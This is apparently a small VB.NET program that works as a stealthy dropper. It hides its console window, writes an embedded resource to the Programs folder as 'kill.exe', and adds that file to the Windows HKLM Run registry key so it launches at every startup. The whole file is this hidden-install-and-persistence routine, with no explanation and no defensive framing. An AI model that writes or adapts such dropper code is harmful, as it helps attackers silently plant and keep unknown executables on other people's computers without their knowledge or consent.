Imports System.Windows.Forms
Module Module1
    Declare Function GetConsoleWindow Lib "kernel32" () As IntPtr
    Declare Function ShowWindow Lib "user32" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    Dim SDir As String
    Dim total As String
    Sub Main()
        Dim int As New IntPtr
        int = GetConsoleWindow
        ShowWindow(int, 0)
        SDir = My.Computer.FileSystem.SpecialDirectories.Programs
        total = SDir + "\" + "kill.exe"
        Dim buffer As Byte() = My.Resources.kill1
        My.Computer.FileSystem.WriteAllBytes(total, buffer, False)
        My.Computer.Registry.SetValue("HKEY_LOCAL_Machine\SoftWare\Microsoft\Windows\CurrentVersion\Run", "Kill", total)
    End Sub
End Module
